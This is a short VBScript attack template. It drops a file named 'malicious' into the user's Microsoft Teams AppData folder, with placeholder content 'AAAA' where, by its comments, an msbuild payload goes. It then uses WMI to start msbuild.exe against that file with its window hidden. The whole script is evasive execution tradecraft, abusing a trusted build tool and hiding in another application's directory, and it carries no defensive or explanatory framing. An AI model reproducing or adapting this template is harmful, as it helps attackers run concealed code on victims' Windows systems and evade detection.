Set fso = CreateObject("Scripting.FileSystemObject")
Set env = CreateObject("WScript.Shell")

Rem first write the patch msbuild.exe to disk

Set fd = fso.CreateTextFile(env.ExpandEnvironmentStrings("%USERPROFILE%") & "\\AppData\\Local\\Microsoft\\Teams\\current\\malicious", True)
fd.Write "AAAA"
fd.Close

Rem second write your msbuild payload

Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = wmi.Get("Win32_ProcessStartup")
Set process = wmi.Get("Win32_Process")
Set config = objStartup.SpawnInstance_
config.ShowWindow = 0

process.Create "C:\\msbuild.exe " & env.ExpandEnvironmentStrings("%USERPROFILE%") & "\\AppData\\Local\\Microsoft\\Teams\\current\\malicious" , Null, config, id




